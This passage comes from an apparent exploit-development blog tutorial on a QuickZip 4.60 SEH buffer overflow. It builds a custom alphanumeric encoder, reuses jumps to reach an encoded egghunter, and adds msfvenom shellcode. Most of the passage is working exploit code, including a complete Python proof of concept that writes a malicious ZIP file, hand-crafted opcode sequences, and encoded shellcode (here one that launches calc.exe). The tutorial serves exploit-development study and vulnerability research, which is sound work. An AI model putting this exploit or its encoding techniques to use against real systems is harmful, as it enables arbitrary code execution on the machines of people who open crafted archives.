First of all, we need to adjust the stack to be able to write to the area of memory we control. Looking at the values of `ESP` and where we currently are (screenshot above), we need to offset the `ESP` by `0x62C` (`0x0018FB58` (value of `EIP`) minus `0x0018F528` (value of `ESP`) minus `0x4` (empty bytes for padding)).

This can be achieved using the following instructions:

```
push esp;
pop eax;
add eax, 0x62C;
push eax;
pop esp;
```

Corresponding OPCODES of above instructions are as follows:

```
"\x54"                  # push esp;
"\x58"                  # pop eax;
"\x05\x2c\x06\x00\x00"  # add eax, 0x62C
"\x50"                  # push eax;
"\x5c"                  # pop esp;
```

However, we have a problem - "\x05\x2c\x06\x00\x00" has two `NULL` bytes, which would break our exploit.

However, we can easily fix it up by performing number of `ADD` and `SUB` instructions using valid characters to set the value we want, e.g.

```
\x05\x2d\x07\x01\x01    # add eax, 0x0101072D
\x2d\x01\x01\x01\x01    # sub eax, 0x01010101
                        # total:   0x00000630
```

Voilà! We were able to achieve the same thing using valid characters. Let's update the exploit and see what happens.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/18.stack adjusted.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/18.stack adjusted.png)

Great, our payload does exactly what we need leaving us with adjusted stack, ready to start writing our encoder.

*Note:* because of the `pop esp` instruction (`\x5c`), contents of our ZIP file look a little bit different. The `\x5c` represents a backslash, which is interpreted by QuickZip as a folder... this may have some implications later, but that's OK for now.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/19.quickzip folder.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/19.quickzip folder.png)

Now, the last thing we need to do is to write a set of instructions that put a start address of the egghunter into EAX and jump to it.

In order to avoid bad characters, we'll set the values of opcodes we need in the `EAX` register and push it on the stack that we have adjusted. This way, the instructions we need will be written in the area we control.

It's probably best explained using an example.

Let's start off with what instructions do we actually want to write? The following will do exactly what we need:
```
push esp;
pop eax;
sub eax, 0xDEADBEEF
jmp eax;
```

Pretty simple - push `ESP` on the stack, pop it into EAX, adjust it by a certain value to land in the egghunter (we don't know the exact value, hence the placeholder `0xDEADBEEF` for now) and jump to the adjusted address from `EAX`.

Let's generate the bytes we need:

```
metasm > push esp
"\x54"
metasm > pop eax
"\x58"
metasm > sub eax, 0xDEADBEEF
"\x2d\xef\xbe\xad\xde"
metasm > jmp eax
"\xff\xe0"
```

And write them in groups of 4:

```
\x54\x58\x2d\xef
\xbe\xad\xde\xff
\xe0\x90\x90\x90
```

Since we'll be writing 4 bytes at a time, we needed to pad it out with 3 nops (`\x90`) at the end (to put the total length of bytes to write to 12).

Now, let's write the bytes starting from bottom-right (because [endianness](https://en.wikipedia.org/wiki/Endianness)) - this will indicate the values that we actually need to push onto the stack.

```
\x90\x90\x90\xe0
\xff\xde\xad\xbe
\xef\x2d\x58\x54
```

Remembering that we can only use ASCII values, that means that we should be able to use pretty much any combination of bytes from `01` to `7f` for our calculations.

Let's come up with an exploit friendly instructions to write first set of bytes into eax:

{%codeblock lang:python%}
                        # zero out EAX
"\x25\x10\x10\x10\x10"  # and eax,0x10101010
"\x25\x01\x01\x01\x01"  # and eax,0x01010101
                           # write 0x909090e0 into EAX
"\x05\x70\x70\x70\x70"  # add eax, 0x70707070
"\x05\x70\x20\x20\x20"  # add eax, 0x20202070
"\x50"                  # push eax;
{% endcodeblock %}

Let's update the exploit code and run it.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/20.writing bytes 1.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/20.writing bytes 1.png)

Fantastic, we have successfully set the value we need in the EAX and pushed it onto the stack, what has actually written the instructions we need!

Let's do the same for all remaining bytes.

After all that maths, the updated PoC should look as follows:

{%codeblock lang:python%}
#!/usr/bin/python
 
header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
 
header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
 
print "[+] Building PoC.."

max_size = 4064
nseh_offset = 292
jump_offset = 92

# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
# [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
egghunter = ("\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42"
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x66\x51\x49\x4b"
"\x52\x73\x53\x63\x62\x73\x36\x33\x4e\x53\x6f\x30\x75\x36"
"\x6d\x51\x59\x5a\x49\x6f\x36\x6f\x72\x62\x71\x42\x42\x4a"
"\x66\x46\x56\x38\x74\x73\x78\x49\x4c\x4b\x4b\x64\x61\x74"
"\x49\x6f\x47\x63\x31\x4e\x50\x5a\x77\x4c\x77\x75\x53\x44"
"\x49\x79\x38\x38\x52\x57\x36\x50\x50\x30\x33\x44\x6c\x4b"
"\x59\x6a\x4e\x4f\x32\x55\x38\x64\x4e\x4f\x70\x75\x6b\x51"
"\x6b\x4f\x79\x77\x41\x41")

payload = egghunter
payload += "A" * (nseh_offset - len(payload) - jump_offset)   # padding for nSEH

# Offset the stack by 0x62C to start writing to a controlled area of memory
#
payload += "\x54"                   # push esp;
payload += "\x58"                   # pop eax;
payload += "\x05\x2d\x07\x01\x01"   # add eax, 0x0101072D
payload += "\x2d\x01\x01\x01\x01"   # sub eax, 0x01010101
payload += "\x50"                   # push eax;
payload += "\x5c"                   # pop esp;

# Write instructions for: push esp; pop eax; sub eax, 0xDEADBEEF; jmp eax
#
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0x909090e0 into EAX
payload += "\x05\x70\x70\x70\x70"   # add eax, 0x70707070
payload += "\x05\x70\x20\x20\x20"   # add eax, 0x20202070
payload += "\x50"                   # push eax;
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xffdeadbe into EAX
payload += "\x05\x77\x77\x77\x77"   # add eax, 0x77777777
payload += "\x05\x37\x25\x57\x77"   # add eax, 0x77572537
payload += "\x05\x10\x11\x10\x11"   # add eax, 0x11101110
payload += "\x50"                   # push eax;
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xef2d5854 into EAX
payload += "\x05\x43\x47\x1c\x77"   # add eax, 0x771c4743
payload += "\x05\x10\x10\x01\x77"   # add eax, 0x77011010
payload += "\x05\x01\x01\x10\x01"   # add eax, 0x01100101
payload += "\x50"                   # push eax;

payload += "A" * (nseh_offset - len(payload))   # padding for the rest of encoder

payload += "\x71\x9b\x70\x9b"   # nSEH: jno $-99; jo $-99   => '9b' will actually be converted to 'a2', which is $-92
payload += "\x33\x28\x42\x00"   # SEH

payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev"
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"

{% endcodeblock %}

And that's how it looks after execution:

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written instructions.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written instructions.png)

Fantastic, we have successfully written code that we want using only valid characters! All that's left to do now is to jump back to that area to get it executed. We'll also need to change our temporary `0xDEADBEEF` address that we have written to the actual offset once we know what it is... but that's at the end.


Jumping around
--------------

Unfortunately we don't have much space to jump around. Only **5** bytes after our custom encoder code and **4** bytes before the encoder code. We need to come up with instructions that will get us to the code we have just written.

Turns out, there's actually not much that we can do due to the character restriction. Any short backward jumps contain invalid characters and don't get us where we need to be. Also, if we were to reuse the jump we took before... hang on... the jump we used before.... hmmmm.

Have a look at the payload we currently have.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written instructions.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/21.written instructions.png)

We need to get creative. Let's reuse the `JNO` jump back we already have in our SEH to put us back again in the area we control. At the very beginning of the encoder payload that we currently have, we'll add some NOPs that will be then overwritten with another jump back instruction by our custom encoder to put us before the code we have just recently written.

Phew, hope it makes sense? Let me explain.

The jump we'll need to use will be simply `JMP $-16` (`\xeb\xee`), unfortunately it contains invalid characters and it won't work for us.... any jump with valid characters will put us too far 'up'.

However! We can write it using the encoder we already have, exactly the same way we've done it for putting address of egghunter to `EAX` - we'll just need to adjust our offsets and modify code a little bit.

First of all, instead of those few NOPs that we were writing using our encoder, we'll add our `JMP` instruction. Secondly, we'll need to modify our initial stack adjustment to land exactly where the SEH jump will initialy take us. Lastly, we'll add some NOPs that will be overwritten at the very beginning of the encoder. A lot to take in, but let's see how it works in action - hopefully it'll be clearer.

Let's start with NOPs before our custom encoder. Since we need to use valid character set, we can use `\x41\x41` (`INC ECX`) as our NOPs.

Next, stack adjustment. Looking at current state, it appears that we'll need to offset it **6** bytes further to start writing into the area we want to overwrite. Let's make that change as well.

Lastly, we'll need to write the `JNZ $-16` (`\x75\xee`) instruction with our encoder. Let's just replace last two `\x90` with the new instruction (remembering about little-endianness and that we need to write it in reverse).

Putting it all together, the changes should look like this:

{%codeblock lang:python%}
#...snip...

nseh_offset = 292
jump_offset = 92

#...snip...

payload = egghunter
payload += "A" * (nseh_offset - len(payload) - jump_offset)    # padding for nSEH

payload += "\x41\x41"   # INC ECX (acts as NOPs, but using valid character set)

# Offset the stack by 0x632 to start writing to a controlled area of memory
#
payload += "\x54"                   # push esp;
payload += "\x58"                   # pop eax;
payload += "\x05\x33\x07\x01\x01"   # add eax, 0x01010733
payload += "\x2d\x01\x01\x01\x01"   # sub eax, 0x01010101
payload += "\x50"                   # push eax;
payload += "\x5c"                   # pop esp;

# Write instructions for: push esp; pop eax; sub eax, 0xDEADBEEF; jmp eax; jnz 0xee
#
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xee7590e0 into EAX  ==>> '0xee75' represents 'JNZ $-16' instruction
payload += "\x05\x70\x70\x74\x77"   # add eax, 0x77747070
payload += "\x05\x70\x20\x01\x77"   # add eax, 0x77012070
payload += "\x50"                   # push eax;
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xffdeadbe into EAX
payload += "\x05\x77\x77\x77\x77"   # add eax, 0x77777777
payload += "\x05\x37\x25\x57\x77"   # add eax, 0x77572537
payload += "\x05\x10\x11\x10\x11"   # add eax, 0x11101110
payload += "\x50"                   # push eax;
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xef2d5854 into EAX
payload += "\x05\x43\x47\x1c\x77"   # add eax, 0x771c4743
payload += "\x05\x10\x10\x01\x77"   # add eax, 0x77011010
payload += "\x05\x01\x01\x10\x01"   # add eax, 0x01100101
payload += "\x50"                   # push eax;

payload += "A" * (nseh_offset - len(payload))       # padding for the rest of the encoder

payload += "\x71\x9b\x70\x9b"       # nSEH: jno $-99; jo $-99   => '9b' will actually be converted to 'a2', which is $-92
payload += "\x33\x28\x42\x00"       # SEH

#...snip...
{% endcodeblock %}

Once we execute it, the following should happen:

1. Crash is triggered
2. *POP-POP-RET* instructions are called
3. Backwards jump `JNO $-92` is taken
4. Execution of custom encoder starts
5. The code will eventually reach `JNO` instruction from step 3
6. `JNO` jump is taken again, but this time, the first instruction we land at is the newly written jump back by **16** bytes
7. Jump is taken
8. Instructions written using the custom encoder will execute

Let's see if that's what really happens.

* After execution of custom encoder: *
[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/22.jump taken 1.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/22.jump taken 1.png)

* `JMP` is taken *
[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/23.jump taken 2.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/23.jump taken 2.png)

* Landed before written instructions, ready to execute *
[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/24.jump taken 3.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/24.jump taken 3.png)

Awesome, exactly what we expected! Now we just need to figure out what value to replace `0xDEADBEEF` with and we're pretty much done!

Let's calculate it - current value of `ESP` is `0x0018FB4E` and our egghunter code starts at `0x0018FA90`, this means that we need to offset EAX by `0xBE` to have `EAX` pointing where we need it to.

Let's modify our exploit to instead of subtracting `0xDEADBEEF` from `EAX`, we'll only take away `0xBE`. The following changes should be made to the PoC:

{% codeblock %}

                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xff000000 into EAX
payload += "\x05\x01\x01\x01\x77"   # add eax, 0x77010101
payload += "\x05\x01\x01\x01\x77"   # add eax, 0x77010101
payload += "\x05\x10\x10\x10\x22"   # add eax, 0x22101010
payload += "\x2d\x12\x12\x12\x11"   # sub eax, 0x11121212
payload += "\x50"                   # push eax;
                                    # Zero-out EAX
payload += "\x25\x01\x01\x01\x01"   # and eax,0x01010101
payload += "\x25\x10\x10\x10\x10"   # and eax,0x10101010
                                       # write 0xbe2d5854 into EAX
payload += "\x05\x43\x47\x1c\x67"   # add eax, 0x671c4743
payload += "\x05\x11\x11\x11\x57"   # add eax, 0x57111111
payload += "\x50"                   # push eax;
{% endcodeblock %}

Let's run it and see where it gets us.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/28.beginning of the egghunter.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/28.beginning of the egghunter.png)

AWESOME! We landed in our egghunter. Now it should be as easy as inserting shellcode of our choice and letting egghunter find it.

Let's run `!mona findmsp` just in case to see if our payload is still there in memory...

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/29.no payload.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/29.no payload.png)

What?! It disappeared! Where did it go? What happened? All that work for nothing????

**_ fast-forward a couple of hours _**

Ok, I know what happens. The instruction we added at the very beginning of our custom encoding routine breaks the payload and makes our shellcode disappear. Instruction at fault is `POP ESP` (`\x5c`) - the same byte from before that made our filename to be interpreted as a directory!

I spent a lot of time thinking, debugging and trying to come up with an alternative that doesn't break the payload, but with no luck. We simply don't have anything we could use in this case that uses valid character set.

However, there is a solution! Maybe not the prettiest, but there is. Have a look at the following line in our exploit:

{%codeblock lang:python%}
exploit = header_1 + payload + header_2 + payload + header_3
{% endcodeblock %}

What if we add payload once again after the header_3? It'll basically append some garbage at the end of the ZIP file, but it should still work. Let's give it a shot!

Modify the line as follows and open it us with QuickZip.

{%codeblock lang:python%}
exploit = header_1 + payload + header_2 + payload + header_3 + payload
{% endcodeblock %}

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/30.quickzip warning.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/30.quickzip warning.png)

There's a warning displayed that there's some garbage at the end of the file, but that's OK, it appears that we can still successfully open the file.

Let's trigger the crash and see once again if, this time, we can find the pattern in memory.

[![image](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/31. shellcode found again.png)](/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/31. shellcode found again.png)

Hurray!!! It's there!!! Now it should be all nice and easy.


Shellcode
---------

Now we just need to follow the usual process of setting up the payload for shellcode - we need to figure out bad characters, insert an "egg" (`w00tw00t`) before the shellcode and align the stack.

I won't go into the details of finding bad characters as I already covered it in details [here](http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/). Luckily for us, the only bad characters for this part of payload are `\x00`, `\x0a` and `\x0d`.

We also need to insert `w00tw00t` characters at the very beginning of our shellcode to ensure that the egghunter can locate it and redirect execution to first instructions after the "egg".

Lastly, we'll need to align the stack to make sure `ESP` points to an address which is a multiple of 16 bytes. The reason for this is that there are some "[SIMD](https://en.wikipedia.org/wiki/SIMD)" (Single Instruction, Multiple Data) instructions which can perform parallel operations on multiple words in memory, but require those multiple words to be a block starting at an address which is a multiple of 16 bytes.

If we didn't align the stack properly, the shellcode simply wouldn't work. We can easily align the stack with a single instruction
`AND esp,0xFFFFFFF0`, which we'll add right behind the `w00tw00t` egg and before the actual shellcode.

For PoC, we'll use `msfvenom` to generate a simple, `calc` popping shellcode. To sum it all up, the shellcode code will look as follows:

{%codeblock lang:python%}
shellcode = "w00tw00t"                     # egg
shellcode += "\x81\xe4\xf0\xff\xff\xff"    # align the stack: AND esp,0xFFFFFFF0
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\x0d'
# [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)
shellcode += ("\xbf\xdc\xae\x26\x3d\xda\xdd\xd9\x74\x24\xf4\x5b\x31\xc9"
"\xb1\x33\x31\x7b\x12\x03\x7b\x12\x83\x37\x52\xc4\xc8\x3b"
"\x43\x80\x33\xc3\x94\xf3\xba\x26\xa5\x21\xd8\x23\x94\xf5"
"\xaa\x61\x15\x7d\xfe\x91\xae\xf3\xd7\x96\x07\xb9\x01\x99"
"\x98\x0f\x8e\x75\x5a\x11\x72\x87\x8f\xf1\x4b\x48\xc2\xf0"
"\x8c\xb4\x2d\xa0\x45\xb3\x9c\x55\xe1\x81\x1c\x57\x25\x8e"
"\x1d\x2f\x40\x50\xe9\x85\x4b\x80\x42\x91\x04\x38\xe8\xfd"
"\xb4\x39\x3d\x1e\x88\x70\x4a\xd5\x7a\x83\x9a\x27\x82\xb2"
"\xe2\xe4\xbd\x7b\xef\xf5\xfa\xbb\x10\x80\xf0\xb8\xad\x93"
"\xc2\xc3\x69\x11\xd7\x63\xf9\x81\x33\x92\x2e\x57\xb7\x98"
"\x9b\x13\x9f\xbc\x1a\xf7\xab\xb8\x97\xf6\x7b\x49\xe3\xdc"
"\x5f\x12\xb7\x7d\xf9\xfe\x16\x81\x19\xa6\xc7\x27\x51\x44"
"\x13\x51\x38\x02\xe2\xd3\x46\x6b\xe4\xeb\x48\xdb\x8d\xda"
"\xc3\xb4\xca\xe2\x01\xf1\x25\xa9\x08\x53\xae\x74\xd9\xe6"
"\xb3\x86\x37\x24\xca\x04\xb2\xd4\x29\x14\xb7\xd1\x76\x92"
"\x2b\xab\xe7\x77\x4c\x18\x07\x52\x2f\xff\x9b\x3e\x9e\x9a"
"\x1b\xa4\xde")
{% endcodeblock %}

